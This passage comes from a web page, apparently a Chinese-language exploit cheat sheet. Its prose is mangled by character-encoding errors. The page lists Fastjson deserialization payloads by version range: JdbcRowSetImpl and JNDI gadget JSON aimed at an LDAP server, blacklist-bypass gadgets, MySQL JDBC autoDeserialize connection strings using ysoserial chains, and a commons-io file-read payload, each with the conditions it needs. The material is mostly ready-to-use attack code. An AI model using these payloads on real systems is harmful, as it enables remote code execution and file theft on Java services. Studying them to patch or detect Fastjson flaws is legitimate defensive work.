class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Fastjson-x3D-1-2-47"><a href="#Fastjson-x3D-1-2-47" class="headerlink" title="Fastjson &#x3D; 1.2.47"></a><strong>Fastjson &#x3D; 1.2.47</strong></h2><h3 id="åˆ©ç”¨æ¡ä»¶-4"><a href="#åˆ©ç”¨æ¡ä»¶-4" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 æœªå¼€å¯autoTypeSupport<br>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 autoTypeSupportå¼€å¯æˆ–æœªå¼€å¯å‡å¯åˆ©ç”¨</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;A&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67ï¼ˆè¦æœ‰ä¾èµ–ï¼‰"><a href="#1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67ï¼ˆè¦æœ‰ä¾èµ–ï¼‰" class="headerlink" title="1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67ï¼ˆè¦æœ‰ä¾èµ–ï¼‰"></a><strong>1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67</strong>ï¼ˆè¦æœ‰ä¾èµ–ï¼‰</h2><p>Fastjson1.2.48ä¿®å¤JSONå†…ç½®ç»•è¿‡æ–¹æ³•ï¼Œæ­¤ç‰ˆæœ¬å†…å¤šä¸ºé’ˆå¯¹é»‘åå•ç»•è¿‡ï¼Œéœ€è¦ç›¸åº”ç»„ä»¶æ‰å¯ä½¿ç”¨</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>&lt;&#x3D;1.2.62</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¾èµ–</span></span><br><span class="line"><span class="comment">// &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">//          &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">//          &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">//          &lt;version&gt;x.x&lt;/version&gt;</span></span><br><span class="line"><span class="comment">//     &lt;/dependency&gt;</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;ldap://127.0.</span></span><br><span class="line"><span class="string">0.1:1389/Basic/Command/calc&quot;</span>&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure></div><p>fastjson &lt;&#x3D; 1.2.66é»‘åå•ç»•è¿‡ï¼Œéœ€autoTypeSupportå±æ€§ä¸ºtrue</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="string">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;proper</span></span><br><span class="line"><span class="string">ties:</span></span><br><span class="line"><span class="string">&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>java.util.Properties<span class="string">&quot;,&quot;</span>UserTransaction<span class="string">&quot;:&quot;</span>ldap:<span class="comment">//127.0.0.1:1389/Basic/Command/calc&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="Fastjson-x3D-1-2-68-è¦æœ‰ä¾èµ–"><a href="#Fastjson-x3D-1-2-68-è¦æœ‰ä¾èµ–" class="headerlink" title="Fastjson &#x3D; 1.2.68(è¦æœ‰ä¾èµ–)"></a><strong>Fastjson &#x3D; 1.2.68</strong>(è¦æœ‰ä¾èµ–)</h2><h3 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h3><p>FastJSON1.2.68æ–°å¼•å…¥safeModeï¼Œé…ç½®safeModeä¸ºtrue,é»‘ç™½åå•å‡ä¸æ”¯æŒautoType,é»˜è®¤ä¸ºfalse,ä¸å½± å“ä»£ç è°ƒç”¨ã€‚ç»è¿‡æºç åˆ†æï¼Œè¾¾åˆ°ä»¥ä¸‹æ¡ä»¶åˆ™å¯é€šè¿‡ParserConfig#checkAutoType()å®‰å…¨æ ¡éªŒ:</p><p>expectClassä¸ºç©º:</p><ol><li>typeNmaeä¸åœ¨denyHashCodesé»‘åå•ä¸­(å¿…é¡»æ¡ä»¶)</li><li>SafeModeä¸ºfalse(å¿…è¦æ¡ä»¶ï¼Œé»˜è®¤ä¸ºfalse)</li><li>typeNameåœ¨TypeUtils#mappingsä¸­ä¸”expectClassä¸ºç©ºä¸”typeNameä¸ä¸ºHashMapä¸”ä¸ä¸º</li></ol><p>expectClasså­ç±» expectClassä¸ä¸ºç©º:</p><ol><li>typeNmaeå’ŒexpectClasså‡ä¸åœ¨denyHashCodesé»‘åå•ä¸­(å¿…é¡»æ¡ä»¶)</li><li>autoTypeSupportä¸ºfalse(é»˜è®¤ä¸ºfalse)</li><li>expectClassåœ¨TypeUtils#mappingsä¸­</li><li>typeNameä¸æ˜¯ClassLoaderã€DataSourceã€RowSetçš„å­ç±»</li><li>expectClassä¸ä¸ºnullï¼Œä¸”ä¸ä¸ºObject.classã€Serializable.classã€Cloneable.classã€</li></ol><p>Closeable.classã€EventListener.classã€Iterable.classã€Collection.class</p><ol start="6"><li>typeNameæ˜¯expectClassçš„å­ç±»</li></ol><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><p>ä¾èµ–</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x.xx<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>ServerStatusDiffInterceptoré“¾</p><ul><li>5.1.0-5.1.10:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffI nterceptor&amp;user&#x3D;yso_JRE8u20_calc è¿æ¥åéœ€æ‰§è¡ŒæŸ¥è¯¢ </li><li>5.1.11-5.x.xx:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffI nterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDif fInterceptor&amp;user&#x3D;yso_JRE8u20_calc (åŒ…åä¸­æ·»åŠ cj)</li><li>8.0.20ä»¥ä¸‹:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInte rceptor&amp;user&#x3D;yso_JRE8u20_calc</li></ul><p>detectCustomCollationsé“¾</p><ul><li>5.1.19-5.1.28:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.40:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc </li><li>5.1.41 ä»¥ä¸Š ä¸å¯ç”¨</li></ul><p>åˆ©ç”¨é“¾åˆ†æ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**queryInterceptors:**ä¸€ä¸ªé€—å·åˆ†å‰²çš„Classåˆ—è¡¨(å®ç°äº† com.mysql.cj.interceptors.QueryInterceptoræ¥å£çš„Class)ï¼Œåœ¨Query&quot;ä¹‹é—´&quot;è¿›è¡Œæ‰§è¡Œæ¥å½±å“ç»“ æœã€‚(æ•ˆæœä¸Šæ¥çœ‹æ˜¯åœ¨Queryæ‰§è¡Œå‰åå„æ’å…¥ä¸€æ¬¡æ“ä½œ) **autoDeserialize:**è‡ªåŠ¨æ£€æµ‹ä¸ååºåˆ—åŒ–å­˜åœ¨BLOBå­—æ®µä¸­çš„å¯¹è±¡ã€‚</span><br></pre></td></tr></table></figure></div><p>detectCustomCollationsé“¾:</p><ul><li>&lt;8.0.20: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInte rceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x(å±æ€§åä¸åŒ): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDif fInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.11åŠä»¥ä¸Šçš„5.xç‰ˆæœ¬(åŒ…åæ²¡æœ‰äº†cj): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc<br>detectCustomCollationsè§¦å‘:</li><li>5.1.41åŠä»¥ä¸Š: ä¸å¯ç”¨</li><li>5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc </li><li>5.1.28-5.1.19: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.18ä»¥ä¸‹çš„5.1.xç‰ˆæœ¬: ä¸å¯ç”¨ </li><li>5.0.xç‰ˆæœ¬ä¸å¯ç”¨</li><li>5.1.41ç‰ˆæœ¬åï¼Œä¸å†ä½¿ç”¨getObject()è·å–â€SHOW COLLATIONâ€çš„ç»“æœï¼Œæ­¤é“¾å¤±æ•ˆ</li></ul><p>ServerStatusDiffInterceptoré“¾:</p><p>payload 5.1.11-5.1.48</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonsCollections5&quot;</span><span class="punctuation">,</span> <span class="comment">// åˆ©ç”¨é“¾ </span></span><br><span class="line">      <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pass&quot;</span><span class="punctuation">,</span> </span><br><span class="line">      <span class="attr">&quot;statementInterceptors&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;databaseToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>payload 6.0.2&#x2F;6.0.3</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;connectionString&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span> </span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>6.0.4ä¸­æ„é€ æ–¹æ³•æ”¹å˜ï¼Œæ­¤åˆ©ç”¨é“¾æ— æ³•ä½¿ç”¨</p></blockquote><p>payload 8.0.19</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;connectionUrl&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;masters&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;slaves&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;yso_CommonsCollections4_calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span><span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;pass&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;queryInterceptors&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br><span class="line"><span class="string">&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span><span class="string">&quot;true&quot;</span></span><br><span class="line">     <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><h4 id="æ–‡ä»¶å†™å…¥è¯»å–"><a href="#æ–‡ä»¶å†™å…¥è¯»å–" class="headerlink" title="æ–‡ä»¶å†™å…¥è¯»å–"></a>æ–‡ä»¶å†™å…¥è¯»å–</h4><p>ä¾èµ–</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>payload</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;abc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///D:/1.txt&quot;</span><span class="comment">//æ­¤å¤„ä¼ å…¥URL,åˆ™æ­¤å¤„å¯ä½¿ç”¨file jar http ç­‰åè®®</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">          <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">66</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œç”¨äº†FastJSONçš„ç‰¹æ€§<code>&quot;$ref&quot;&quot;: &quot;$.xx.yy&quot;</code>è¡¨ç¤ºè°ƒç”¨JSONå¯¹è±¡ä¸­xxçš„yyå±æ€§çš„getterã€‚payloadä¸­å³è°ƒç”¨ abc(org.apache.commons.io.input.BOMInputStreamçš„BOMå±æ€§ï¼Œå³è°ƒç”¨BOMInputStreamçš„ getBOM()æ–¹æ³•ã€‚</p></blockquote><h2 id="1-2-72-lt-Fastjson-lt-x3D-1-2-80"><a href="#1-2-72-lt-Fastjson-lt-x3D-1-2-80" class="headerlink" title="1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80"></a><strong>1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</strong></h2><p>FastJSON1.2.80ä¸1.2.68ç›¸æ¯”ï¼ŒParserConfig#checkAutoType()æ·»åŠ äº†æœŸæœ›ç±»é»‘åå•ï¼ŒæœŸæœ›ç±»åœ¨é»‘åå• ä¸­åˆ™æ— æ³•åŠ è½½ï¼Œè‹¥æœŸæœ›ç±»åŠç›®æ ‡ç±»ä¸åœ¨é»‘åå•ä¸­åˆ™å¯ä½¿ç”¨ä¸1.2.68ç±»ä¼¼ç»•è¿‡æ–¹æ³•ç»•è¿‡æ£€æµ‹ã€‚</p><p>ä¾èµ–</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span 